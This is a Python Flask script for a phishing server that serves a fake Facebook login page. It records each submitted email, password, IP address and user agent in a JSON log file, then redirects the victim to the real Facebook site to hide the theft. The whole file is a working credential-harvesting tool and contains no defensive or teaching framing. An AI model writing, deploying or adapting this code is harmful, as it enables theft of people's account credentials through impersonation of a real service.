from flask import Flask, request, render_template_string, redirect
import json
import logging
from datetime import datetime
from config import PHISH_HOST, PHISH_PORT, PHISH_USE_SSL, SSL_CERT, SSL_KEY

app = Flask(__name__)

LOG_FILE = 'logs/phished_creds.json'

# Facebook clone template
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Facebook</title>
<style>
body{background:#f0f2f5;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;}
.box{background:white;padding:20px;border-radius:8px;width:360px;}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;}
button{background:#1877f2;color:white;padding:12px;border:none;border-radius:4px;width:100%;font-size:16px;}
</style>
</head>
<body>
<div class="box">
<h2 style="color:#1877f2;text-align:center;">Facebook</h2>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    creds = {
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'email': request.form.get('email'),
        'password': request.form.get('pass'),
        'user_agent': request.headers.get('User-Agent')
    }
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(creds) + '\n')
    return redirect('https://www.facebook.com')

def start_phish_server():
    if PHISH_USE_SSL:
        app.run(host=PHISH_HOST, port=PHISH_PORT, ssl_context=(SSL_CERT, SSL_KEY), debug=False)
    else:
        app.run(host=PHISH_HOST, port=PHISH_PORT, debug=False)